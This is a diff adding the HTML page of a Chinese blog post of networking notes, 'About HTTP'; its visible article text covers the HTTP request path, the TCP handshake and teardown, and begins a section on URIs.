@@ -1,0 +1,1665 @@
+<!DOCTYPE html>
+<html lang="zh" itemscope
+  itemtype="http://schema.org/Blog">
+
+<head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" /><title>关于HTTP - Obelieve的博客</title>
+  <meta property="og:title" content="关于HTTP" />
+  <meta itemprop="headline" content="关于HTTP" />
+  <meta property="og:description" content="一次HTTP请求链路过程🔗1.首先是==发送端==通过浏览器输入url链接请求资源，浏览器访问==DNS服务==器查询到IP地址。2.传输层通过==TCP协议==对HTTP报文进行分段处理，按编号发送给IP网络层。3.网络层通过==IP协议==进行分发数据包。4.接收端传输层通过==TCP协议==接收数据包，按编号整合成HTTP数据包。5.接收端读取==HTTP数据包==处理请求，并给发送HTTP…" />
+  <meta name="description" content="一次HTTP请求链路过程🔗1.首先是==发送端==通过浏览器输入url链接请求资源，浏览器访问==DNS服务==器查询到IP地址。2.传输层通过==TCP协议==对HTTP报文进行分段处理，按编号发送给IP网络层。3.网络层通过==IP协议==进行分发数据包。4.接收端传输层通过==TCP协议==接收数据包，按编号整合成HTTP数据包。5.接收端读取==HTTP数据包==处理请求，并给发送HTTP…" />
+  <meta property="og:url" content="https://obelieve.github.io/blog/guan-yu-http/" /><meta name="og:type" content="summary" />
+  <meta name="keywords" content="注意力, 读书, 工具分享, 纯文本, 英语学习" />
+  <meta name="author" content="Obelieve" />
+  <meta itemprop="copyrightYear" content=" 2025" />
+  <link rel="icon" href="https://obelieve.github.io/site/images/favicon-32x32.png?h=68480d370330a1370abf" type="image/x-icon">
+  <link rel="apple-touch-icon" sizes="57x57" href="https://obelieve.github.io/site/images/apple-icon-57x57.png?h=920192bead2a51cc200b">
+  <link rel="apple-touch-icon" sizes="60x60" href="https://obelieve.github.io/site/images/apple-icon-60x60.png?h=a7a48024c2427638d967">
+  <link rel="apple-touch-icon" sizes="72x72" href="https://obelieve.github.io/site/images/apple-icon-72x72.png?h=bf72d3c24257c21e2c32">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://obelieve.github.io/site/images/apple-icon-76x76.png?h=cc4dba10aa538acb3c49">
+  <link rel="apple-touch-icon" sizes="114x114" href="https://obelieve.github.io/site/images/apple-icon-114x114.png?h=1aefbd93c1c89c4cbb8a">
+  <link rel="apple-touch-icon" sizes="120x120" href="https://obelieve.github.io/site/images/apple-icon-120x120.png?h=409d89ac71c055f60c18">
+  <link rel="apple-touch-icon" sizes="144x144" href="https://obelieve.github.io/site/images/apple-icon-144x144.png?h=5deaaef8a0670003fd10">
+  <link rel="apple-touch-icon" sizes="152x152" href="https://obelieve.github.io/site/images/apple-icon-152x152.png?h=71161064c00cec1a4f44">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://obelieve.github.io/site/images/apple-icon-180x180.png?h=098b2b0d572b07220509">
+  <link rel="icon" type="image/png" sizes="192x192" href="https://obelieve.github.io/site/images/android-icon-192x192.png?h=8fc96efc0d93b2ca4d24">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://obelieve.github.io/site/images/favicon-32x32.png?h=68480d370330a1370abf">
+  <link rel="icon" type="image/png" sizes="96x96" href="https://obelieve.github.io/site/images/favicon-96x96.png?h=0db83734130603a067c1">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://obelieve.github.io/site/images/favicon-16x16.png?h=c5a1bcfc63c8f941cce5">
+  <meta name="msapplication-TileColor" content="#fffcf9" />
+  <meta name="msapplication-TileImage" content="https://obelieve.github.io/site/images/ms-icon-144x144.png?h=5deaaef8a0670003fd10">
+  <meta name="theme-color" content="#fffcf9" />
+  <meta property="og:site_name" content="Obelieve的博客" />
+  
+  
+  <link rel="alternate" type="application/atom+xml" title="Obelieve的博客 - RSS" href="https://obelieve.github.io/atom.xml">
+  <style>@charset "UTF-8";
+html,
+body,
+p,
+dt,
+dd,
+figure,
+fieldset,
+blockquote,
+legend,
+textarea,
+pre,
+iframe,
+hr,
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+  margin: 0;
+  padding: 0;
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+  font-size: 100%;
+  font-weight: normal;
+}
+
+button,
+input,
+select {
+  margin: 0;
+}
+div {
+  box-sizing: border-box;
+}
+
+img,
+video {
+  height: auto;
+  max-width: 100%;
+}
+
+iframe {
+  border: 0;
+}
+
+table {
+  text-align: justify;
+  width: 100%;
+  border-collapse: collapse;
+  border-spacing: 0;
+  margin-bottom: 1.4em;
+}
+td,
+th {
+  padding: 0.5em;
+  border-bottom: 1px solid var(--colors-divider);
+}
+
+.by {
+  font-size: 1.175rem;
+  padding-bottom: 0.75rem;
+  font-weight: 500;
+}
+
+.feed-entry li {
+  margin-bottom: 0.5rem;
+}
+
+/* --reset end -- */
+/*
+ #d2bf9e
+ #fcfcfc
+ #fffff8
+ #41403e
+ backanother #e6ddd0
+ divider: rgb(226, 232, 240);
+ code back: edf0f3
+ rgb(249, 245, 233)
+239
+#EFEDEA
+/* rgba(0, 0, 0, 0.8)*/
+/*#fffef8
+c35
+f9f5e9
+ea4c89
+fffef8
+#f4ecd8;
+#FDF6E3
+#faf8f1
+background-color:rgb(255, 252, 249);
+#272629
+
+  --colors-background: #efedea;
+  --colors-text: #18181c;
+*/
+html {
+  font-size: 15px;
+  box-sizing: border-box;
+  /* --colors-text: rgba(68, 64, 60, 0.8); */
+  --colors-text: rgba(34, 34, 34);
+  --colors-muted: #718096;
+  --colors-primary: #cc3355;
+  --colors-divider: rgba(0, 0, 0, 0.06);
+  --colors-primary-light: rgba(234, 76, 137, 0.5);
+  --colors-background: #f7f2ed;
+  --colors-code-background: rgba(0, 0, 0, 0.08);
+  /* --colors-quote-background: rgba(255, 255, 255, 0.5); */
+  /* --colors-quote-background: rgb(0 0 0/3%); */
+  --colors-quote-background: hsla(37, 17%, 85%, 0.5);
+  --colors-quote-hover-background: rgba(255, 255, 255, 0.7);
+  --colors-blue: #1ca9c9;
+  --colors-secondary: #14213d;
+  --colors-surface: rgba(0, 0, 0, 0.04);
+  font-family:
+    ui-sans-serif,
+    system-ui,
+    -apple-system,
+    BlinkMacSystemFont,
+    segoe ui,
+    Roboto,
+    helvetica neue,
+    Arial,
+    noto sans,
+    sans-serif,
+    apple color emoji,
+    segoe ui emoji,
+    segoe ui symbol,
+    noto color emoji;
+  font-feature-settings: normal;
+  font-variation-settings: normal;
+}
+
+/* Adds dark mode */
+@media (prefers-color-scheme: dark) {
+  html {
+    --colors-background: #202124;
+    --colors-text: rgb(236, 237, 238);
+    --colors-code-background: rgba(0, 0, 0, 0.08);
+    --colors-quote-background: hsl(226, 15%, 17%);
+    --colors-quote-hover-background: hsl(226, 15%, 20%);
+  }
+}
+body {
+  color: var(--colors-text);
+  background-color: var(--colors-background);
+}
+
+#root {
+  /* margin-left: auto; */
+  /* margin-right: auto; */
+  /* max-width: 120rem; */
+  position: relative;
+}
+
+h1,
+h2,
+h3 {
+  padding-top: 1.4rem;
+  padding-bottom: 1.4rem;
+  margin-bottom: 1rem;
+  line-height: 1;
+  position: relative;
+}
+h4,
+h5,
+h6 {
+  padding-top: 1.1rem;
+  padding-bottom: 1.1rem;
+  margin-bottom: 0.5rem;
+  line-height: 1.1;
+  font-weight: 400;
+  position: relative;
+}
+
+.relative {
+  position: relative;
+}
+
+.bold {
+  font-weight: 600;
+}
+.mb-absolute {
+  margin-bottom: -0.8rem;
+}
+
+.no-border {
+  border: none;
+}
+
+.tweet-box {
+  box-sizing: border-box;
+  overflow: hidden;
+  word-wrap: break-word;
+  border-width: 1px;
+  border-style: solid;
+  border-color: var(--colors-divider);
+  padding-left: 1rem;
+  padding-right: 1rem;
+  padding-bottom: 1.5rem;
+  padding-top: 1.5rem;
+  background: var(--colors-quote-background);
+}
+
+.tweet-box .overlay {
+  position: absolute;
+  left: 0;
+  top: 0;
+  bottom: 0;
+  right: 0;
+}
+.tweet-box .overlay:hover {
+  background-color: var(--colors-quote-hover-background);
+}
+.tweet-box .inner {
+  position: relative;
+  pointer-events: none;
+  z-index: 1;
+}
+
+.tweet-box .inner a {
+  pointer-events: all;
+  position: relative;
+}
+p.tweet-content {
+  line-height: 1.5rem !important;
+  padding-right: 2rem;
+  margin-bottom: 0.6rem;
+  font-size: 0.9rem !important;
+}
+.tweet-content a:link,
+.tweet-content a:visited {
+  -webkit-text-decoration: none;
+  text-decoration: none;
+  color: rgb(27, 149, 224);
+}
+.tweet-avatar-wrapper {
+  margin-right: 0.5rem;
+  margin-bottom: 0;
+  width: 48px;
+  min-width: 48px;
+  border-radius: 9999px;
+}
+.tweet-icon {
+  box-sizing: border-box;
+  margin: 0;
+  min-width: 0;
+  -webkit-text-decoration: none;
+  text-decoration: none;
+  position: absolute;
+  right: 0;
+  top: 0.2rem;
+}
+.tweet-icon-svg {
+  width: 25px;
+  height: 25px;
+  color: rgb(27, 149, 224);
+  fill: currentcolor;
+}
+
+h1 {
+  font-size: 2.4rem;
+}
+
+h2 {
+  font-size: 1.675rem;
+  font-weight: 500;
+}
+
+.feed-entry h2 {
+  font-size: 1.125rem;
+}
+.feed-entry h2.entry-title {
+  font-size: 1.6rem;
+  font-style: normal;
+  font-weight: 500;
+}
+
+.feed-entry h3 {
+  font-size: 1.05rem;
+  font-style: normal;
+}
+p,
+li,
+ul,
+ol {
+  font-size: 1rem;
+  line-height: 1.8rem;
+}
+
+h3 {
+  font-size: 1.375rem;
+  font-style: italic;
+}
+
+article {
+  margin-bottom: 4rem;
+}
+article:last-child {
+  margin-bottom: 0;
+}
+pre {
+  background-color: var(--colors-quote-background);
+  margin-top: 0px;
+  margin-bottom: 1rem;
+  padding: 1.5rem 1rem;
+  border: 0px;
+  border-radius: 0.5rem;
+  overflow: auto;
+}
+
+code {
+  border-radius: 0.25rem;
+  padding: 0.375rem 0.5rem;
+  background-color: var(--colors-code-background);
+}
+
+pre > code {
+  font-size: 0.9rem;
+  display: block;
+}
+
+pre code {
+  background: none;
+}
+
+code,
+pre > code {
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  font-size: 1rem;
+  line-height: 1.42;
+  -webkit-text-size-adjust: 100%;
+  /* Prevent adjustments of font size after orientation changes in iOS. See https://github.com/edwardtufte/tufte-css/issues/81#issuecomment-261953409 */
+}
+
+hr {
+  display: block;
+  height: 1px;
+  width: 55%;
+  border: 0;
+  border-top: 1px solid var(--colors-divider);
+  margin: 2rem 0;
+  padding: 0;
+}
+
+ul {
+  margin-bottom: 0.8rem;
+}
+
+ul > details > summary {
+  margin-left: -1.4rem;
+}
+
+p {
+  margin-bottom: 1.4rem;
+  padding-right: 0;
+  vertical-align: baseline;
+}
+
+blockquote {
+  margin: 2rem 0;
+  position: relative;
+  border-radius: 10px;
+  background-color: var(--colors-quote-background);
+  /* background-color: #efefef; */
+  /* background-color: hsl(60, 9%, 87%); */
+  padding: 1.4rem 1.4rem 0rem 1.4rem;
+  /* border-top: 1px solid var(--colors-divider); */
+  box-sizing: border-box;
+  overflow: auto;
+}
+
+/* blockquote p { */
+/*   font-size: 1.2rem; */
+/*   line-height: 2.1rem; */
+/* } */
+/**/
+/* blockquote p:lang(en) { */
+/*   font-size: 1.3rem; */
+/* } */
+/* blockquote::before{ */
+/*   position: absolute; */
+/*   content:"\201C";  */
+/*   top: 0.875rem; */
+/*   font-size: 2.5rem; */
+/*   color: var(--colors-primary); */
+/*   line-height: .1em; */
+/*   vertical-align: -.4em; */
+/*   font-weight: bold; */
+/*   font-family: Courier, monospace; */
+/* } */
+/* blockquote > p:first-child { */
+/*   text-indent: 2rem; */
+/* } */
+p,
+dl,
+ol,
+ul {
+  line-height: 1.5rem;
+}
+p {
+  line-height: 2.1rem;
+}
+
+p:lang(en),
+dl:lang(en),
+ol:lang(en),
+ul:lang(en) {
+  font-size: 1.2rem;
+  line-height: 1.75rem;
+}
+
+button,
+input[type="submit"] {
+  border-bottom-left-radius: 15px 255px;
+  border-bottom-right-radius: 225px 15px;
+  border-top-left-radius: 255px 15px;
+  border-top-right-radius: 15px 225px;
+  transition: all 235ms ease 0s;
+  box-shadow: 15px 28px 25px -18px rgb(0 0 0 / 20%);
+  transition: all 235ms ease-in-out 0s;
+  align-self: center;
+  background: 0 0;
+  border: 2px solid var(--colors-text);
+  color: var(--colors-text);
+  cursor: pointer;
+  display: inline-block;
+  font-size: 1rem;
+  outline: 0;
+  padding: 0.75rem;
+  font-family: Neucha, sans-serif;
+}
+
+button,
+input[type="submit"]:hover {
+  transform: translate3d(0, 2px, 0);
+  box-shadow: 2px 8px 8px -5px rgb(0 0 0 / 30%);
+}
+
+input[type="url"],
+input[type="text"],
+input[type="search"] {
+  /* -webkit-appearance: none; */
+  background: none;
+  border: 2px solid var(--colors-text);
+  border-bottom-left-radius: 15px 255px;
+  border-bottom-right-radius: 225px 15px;
+  border-top-left-radius: 255px 15px;
+  border-top-right-radius: 15px 225px;
+  color: var(--colors-text);
+  font-size: 1rem;
+  outline: 0;
+  padding: 0.75rem;
+  box-shadow: 15px 28px 25px -18px rgb(0 0 0 / 20%);
+
+  /* -webkit-border-radius: 0px; */
+}
+.display-block {
+  display: block;
+}
+
+input[type="url"]:focus,
+input[type="text"]:focus,
+input[type="search"]:focus {
+  border: 2px solid var(--colors-blue);
+}
+
+#search-bar-input {
+  width: 80%;
+  min-width: 260px;
+}
+
+.meilisearch-autocomplete {
+  display: block !important;
+}
+.meilisearch-autocomplete .dsb-dropdown-menu {
+  max-height: 400px;
+  overflow-y: auto;
+  min-width: 300px;
+  width: 100%;
+}
+input:focus:not(:focus-visible) {
+  border: 2px solid var(--colors-text);
+}
+input:focus-visible {
+  border: 2px solid var(--colors-blue);
+}
+.no-underline {
+  text-decoration: none;
+}
+
+.meilisearch-autocomplete {
+  display: block;
+}
+a {
+  word-break: break-all;
+}
+a:link,
+a:visited {
+  -webkit-transition: color 200ms ease;
+  transition: color 200ms ease;
+  text-decoration: underline;
+  color: inherit;
+  text-decoration-thickness: 1px;
+}
+
+:target {
+  scroll-margin-top: 56px;
+}
+
+.no-underline:link,
+.no-underline:visited,
+.sidebar a:link,
+.sidebar a:visited {
+  text-decoration: none;
+}
+.sidebar {
+  overflow-x: visible;
+  padding-bottom: 1.4rem;
+}
+.no-underline:hover,
+a:hover {
+  color: var(--colors-primary);
+  text-decoration: underline;
+}
+
+.no-hover-underline:hover {
+  text-decoration: none;
+}
+
+.muted,
+a.muted,
+.muted:link,
+.muted:visited {
+  color: var(--colors-muted);
+}
+
+.text {
+  font-size: 1.125rem;
+}
+
+.text-color,
+.text-color:link,
+.text-color:visited {
+  color: var(--colors-text);
+}
+
+.flex {
+  display: flex;
+}
+
+.flex-3 {
+  flex: 3;
+}
+
+.flex-1 {
+  flex: 1;
+}
+
+.flex-1-auto {
+  flex: 1 1 auto;
+}
+
+.flex-wrap {
+  flex-wrap: wrap;
+}
+
+.justify-between {
+  justify-content: space-between;
+}
+
+.justify-center {
+  justify-content: center;
+}
+
+.items-center {
+  align-items: center;
+}
+
+.list-none {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+}
+
+.border-muted {
+  border: 1px solid var(--colors-muted);
+}
+
+.rounded-full {
+  border-radius: 999rem;
+}
+
+.rounded {
+  border-radius: 0.25rem;
+}
+
+.rounded-lg {
+  border-radius: 1rem;
+}
+
+.w-full {
+  width: 100%;
+}
+
+.p-sm {
+  padding: 0.25rem;
+}
+
+.icon {
+  width: 2.5rem;
+  height: 2.5rem;
+  border-radius: 999rem;
+}
+
+.inline-block {
+  display: inline-block;
+}
+
+.menu li:not(:last-child) {
+  margin-right: 0.6rem;
+}
+
+.m-l-2 {
+  margin-left: 0.5rem;
+}
+
+.py {
+  padding-top: 1.4rem;
+  padding-bottom: 1.4rem;
+}
+.pt0 {
+  padding-top: 0;
+}
+
+.pb0 {
+  padding-bottom: 0;
+}
+.flex-shrink-0 {
+  flex-shrink: 0;
+}
+.py-sm {
+  padding-top: 0.5rem;
+  padding-bottom: 0.5rem;
+}
+
+.px-sm {
+  padding-left: 0.5rem;
+  padding-right: 0.5rem;
+}
+
+.my {
+  margin-top: 1.4rem;
+  margin-bottom: 1.4rem;
+}
+
+.my-2 {
+  margin-top: 2.4rem;
+  margin-bottom: 2.4rem;
+}
+
+.px {
+  padding-left: 1.4rem;
+  padding-right: 1.4rem;
+}
+.px-2xl {
+  padding-left: 5rem;
+  padding-right: 5rem;
+}
+.pr-sm {
+  padding-right: 0.5rem;
+}
+
+.pl-sm {
+  padding-left: 0.5rem;
+}
+
+.pt {
+  padding-top: 1.4rem;
+}
+
+.pl {
+  padding-left: 1.4rem;
+}
+
+.list-none {
+  list-style: none;
+}
+
+.navbar {
+  position: static;
+  top: 0;
+  left: 0;
+  background-color: var(--colors-background);
+}
+
+.navbar-inner {
+  padding: 0.5rem 1.4rem;
+  box-sizing: border-box;
+  display: flex;
+}
+
+.zola-anchor {
+  margin-left: 0.5rem;
+  text-decoration: none;
+}
+
+.zola-anchor:link,
+.zola-anchor:visited {
+  text-decoration: none;
+}
+
+li.inline {
+  display: inline-block;
+  margin-right: 0.5rem;
+}
+
+.text-bigger {
+  font-size: 1rem;
+}
+.text-lg {
+  font-size: 1.5rem;
+}
+
+.text-sm {
+  font-size: 0.9rem;
+}
+
+.text-sm p {
+  font-size: 0.9rem;
+}
+p.text-sm:lang(en),
+dl.text-sm:lang(en),
+ol.text-sm:lang(en),
+ul.text-sm:lang(en) {
+  font-size: 0.9rem;
+}
+
+.pb {
+  padding-bottom: 1.4rem;
+}
+
+.pb-lg {
+  padding-bottom: 3rem;
+}
+.pb-sm {
+  padding-bottom: 0.5rem;
+}
+
+.p0 {
+  padding: 0;
+}
+
+.no-toc {
+  width: auto;
+}
+.text-center {
+  text-align: center;
+}
+
+.sidebar ul {
+  margin-top: 0;
+  padding-left: 1rem;
+}
+
+.sidebar li {
+  font-size: 1rem;
+}
+
+.nav-divider {
+  border-right: 2px solid var(--colors-divider);
+  height: 24px;
+  margin: 0 1rem 0 0rem;
+}
+
+.h-card {
+  display: flex;
+  align-items: center;
+}
+
+.display-none {
+  display: none;
+}
+
+.mb {
+  margin-bottom: 1.4rem;
+}
+
+.mb-li {
+  margin-bottom: 1rem;
+}
+
+.mb-lg {
+  margin-bottom: 2.4rem;
+}
+
+.mr {
+  margin-right: 1.4rem;
+}
+
+.mr-sm {
+  margin-right: 0.5rem;
+}
+
+.card {
+  /* background: #fff; */
+  background: var(--colors-surface);
+}
+
+.body-zone {
+  padding-left: 1.4rem;
+  padding-right: 1.4rem;
+}
+.header {
+  padding-top: 1.4rem;
+  max-width: 74rem;
+  margin: 0 auto;
+}
+.post-header {
+}
+.header-inner {
+  max-width: 52rem;
+}
+.mt {
+  margin-top: 1.4rem;
+}
+.mb-lg {
+  margin-bottom: 2.4rem;
+}
+
+@media (min-width: 48rem) {
+  .navbar {
+    position: fixed;
+  }
+  .nav-divider {
+    border-top: 2px solid var(--colors-divider);
+    width: 24px;
+    margin: 0.6rem 0 1.6rem 0;
+    height: 0;
+    border-right: none;
+  }
+
+  .navbar {
+    height: 100%;
+    width: 4rem;
+    /*
+    border-right: 1px solid var(--colors-divider);
+ */
+  }
+
+  .navbar-inner {
+    padding: 1.4rem 0.5rem;
+    flex-direction: column;
+    height: 100vh;
+  }
+
+  .menu {
+    flex-direction: column;
+  }
+
+  .menu li:not(:last-child) {
+    margin-bottom: 1rem;
+    margin-right: 0;
+  }
+
+  .body-zone {
+    padding-left: 5.4rem;
+    max-width: 74rem;
+    margin: 0 auto;
+  }
+}
+
+@media (min-width: 52rem) {
+  h1::after,
+  h2::after,
+  h3::after {
+    background-color: var(--colors-background);
+  }
+  .main {
+    margin-right: 19rem;
+  }
+  .main-inner {
+    max-width: 44rem;
+    padding: 0;
+  }
+  .no-toc {
+    width: 20rem;
+  }
+
+  .main-toc {
+    display: none;
+  }
+
+  .sidebar {
+    position: absolute;
+    right: 0;
+    top: 0;
+    border-top: none;
+    width: 16rem;
+  }
+
+  .sidebar ul {
+    border-left: 1px solid var(--colors-divider);
+    list-style: none;
+  }
+
+  .sidebar li {
+    font-size: 0.9rem;
+  }
+
+  .sidebar h2,
+  .sidebar h3 {
+    margin-bottom: 0;
+    font-size: 1rem;
+    /* font-weight: 400; */
+    padding-bottom: 1rem;
+    border: none;
+  }
+}
+.index-intro {
+  font-size: 1rem;
+}
+/*备案地址样式*/
+a.theme-link-gray {
+    text-decoration: none;
+    font-size: 12px;
+    color: #ccc;
+}
+.theme-info {
+    display: inline-block;
+    text-align: center;
+    width: 100%;
+    padding: 10px 0;
+    font-size: 12px;
+}</style><style>html {
+  font-family: "Noto Serif SC", Roboto, Helvetica, Tahoma, Arial, "PingFang SC",
+    "Hiragino Sans GB", "Microsoft YaHei", "Noto Sans CJK",
+    "WenQuanYi Micro Hei", sans-serif;
+}
+</style><link rel="manifest" href="https://obelieve.github.io/site/images/manifest.json">
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-W03M6ZDZWG"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag("js", new Date());
+    gtag("config", "G-W03M6ZDZWG");
+  </script>
+  
+  <meta name="title" content="关于HTTP">
+
+</head>
+
+<body>
+  <div id="top"></div>
+  <div id="root">
+    <div class="body-zone">
+      
+  <header class="header post-header" id="overview">
+       <div class="pb">
+          <a class="" href="https://obelieve.github.io/">Obelieve&#x27;s Blog</a>
+          <span class="divider">&nbsp;&gt;&nbsp;</span>
+          <a class="" href="&#x2F;categories/">All Categories</a>
+          
+          <span class="divider">&nbsp;&gt;&nbsp;</span>
+          <a  class="category" href="https://obelieve.github.io/categories/notes/"> Notes</a>
+          
+          
+          <span class="divider">&nbsp;&gt;&nbsp;</span>
+          关于HTTP
+        </div>
+      
+      <div>
+        <h1 class="no-border pt4 p-name entry-title" >关于HTTP</h1>
+      </div>
+      
+    </header>
+  
+      <div class="main-zone relative">
+        <div class="main">
+          <div class="main-inner">
+            
+<div class="h-entry hentry detail-page">
+<div class="page-body">
+    <div class="display-none p-summary">
+      
+    </div>
+    <a class="display-none u-url" href="https:&#x2F;&#x2F;obelieve.github.io&#x2F;blog&#x2F;guan-yu-http&#x2F;">Permanent Link</a>
+    
+      <div class="main-toc pb">
+        <details>
+          <summary>快速导航</summary>
+          
+    <div class="sidebar-table-content">
+      <ul>
+
+        <li>
+          <a href="https://obelieve.github.io/">博客首页</a>
+        </li>
+        <li>
+          <a href="#start">正文开始</a>
+        </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#yi-ci-httpqing-qiu-lian-lu-guo-cheng">一次HTTP请求链路过程</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#tcpsan-ci-wo-shou">TCP三次握手</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#tcpduan-kai-lian-jie">TCP断开连接</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu">URI(统一资源标识符)和URL（统一资源定位符）</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#httpxie-yi-qing-qiu-bao-wen">HTTP协议请求报文</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#httpxie-yi-xiang-ying-bao-wen">HTTP协议响应报文</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#wang-guan">网关</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#qing-qiu-tou-jie-shao">请求头介绍</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#cookiezhuang-tai-zhui-zong-set-cookie">Cookie状态追踪 ==Set-Cookie==</a>
+            
+              <ul>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#keep-alive-chi-jiu-lian-jie">keep-alive 持久连接</a>
+                    
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan">MIME(Multipurpose Internet Mail Extensions)多用途因特网邮件扩展</a>
+            
+              <ul>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#bu-fen-nei-rong-qing-qiu-huo-qu">部分内容请求获取</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#nei-rong-xie-shang">内容协商</a>
+                    
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#https">HTTPS</a>
+            
+              <ul>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#shu-zi-qian-ming">数字签名</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#shu-zi-zheng-shu">数字证书</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#gen-zheng-shu">根证书</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#httpszheng-shu-ren-zheng-guo-cheng">Https证书认证过程</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#zheng-shu-fen-lei">证书分类</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#https-tong-xin">HTTPS 通信</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#shen-fen-ren-zheng">身份认证</a>
+                    
+                      <ul>
+                        
+                          <li>
+                            <a href="https://obelieve.github.io/blog/guan-yu-http/#basicren-zheng">BASIC认证</a>
+                            
+                          </li>
+                        
+                          <li>
+                            <a href="https://obelieve.github.io/blog/guan-yu-http/#biao-dan-ren-zheng">表单认证</a>
+                            
+                          </li>
+                        
+                          <li>
+                            <a href="https://obelieve.github.io/blog/guan-yu-http/#webdav">WebDAV</a>
+                            
+                          </li>
+                        
+                      </ul>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#css">CSS</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#xml">XML</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#sgml">SGML</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#json">JSON</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#xss">XSS</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#sql-zhu-ru-gong-ji">SQL 注入攻击</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#oszhu-ru-gong-ji">OS注入攻击</a>
+                    
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+        <li>
+          <a href="#response">回应区</a>
+        </li>
+
+      </ul>
+    </div>
+  
+        </details>
+      </div>
+    
+    <div id="start"></div>
+    <article class="e-content entry-content">
+      <h2 id="yi-ci-httpqing-qiu-lian-lu-guo-cheng">一次HTTP请求链路过程<a class="zola-anchor" href="#yi-ci-httpqing-qiu-lian-lu-guo-cheng" aria-label="Anchor link for: yi-ci-httpqing-qiu-lian-lu-guo-cheng">🔗</a></h2>
+<ul>
+<li>1.首先是==发送端==通过浏览器输入url链接请求资源，浏览器访问==DNS服务==器查询到IP地址。</li>
+<li>2.传输层通过==TCP协议==对HTTP报文进行分段处理，按编号发送给IP网络层。</li>
+<li>3.网络层通过==IP协议==进行分发数据包。</li>
+<li>4.接收端传输层通过==TCP协议==接收数据包，按编号整合成HTTP数据包。</li>
+<li>5.接收端读取==HTTP数据包==处理请求，并给发送HTTP响应报文。</li>
+</ul>
+<h2 id="tcpsan-ci-wo-shou">TCP三次握手<a class="zola-anchor" href="#tcpsan-ci-wo-shou" aria-label="Anchor link for: tcpsan-ci-wo-shou">🔗</a></h2>
+<p>首先是发送端==发送SYN（synchronize）==数据包给接收端，
+接收端收到后==回复SYN/ACK(acknowledgement)==数据包给发送端，
+然后发送端再==发送ACK==数据包给接收端，连接建立。
+如果中间中断，重新发送。</p>
+<h2 id="tcpduan-kai-lian-jie">TCP断开连接<a class="zola-anchor" href="#tcpduan-kai-lian-jie" aria-label="Anchor link for: tcpduan-kai-lian-jie">🔗</a></h2>
+<p>首先==接收端发送FIN==数据包给发送端，
+然后==发送端回复ACK==数据包给接收端，
+然后==发送端发送FIN==数据包给接收端，
+最后==接收端回复ACK==数据包给发送端。</p>
+<h2 id="uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu">URI(统一资源标识符)和URL（统一资源定位符）<a class="zola-anchor" href="#uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu" aria-label="Anchor link for: uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu">🔗</a></h2>
+<ul>
+<li>scheme：协议方案  http: | ftp:</li>
+</ul>
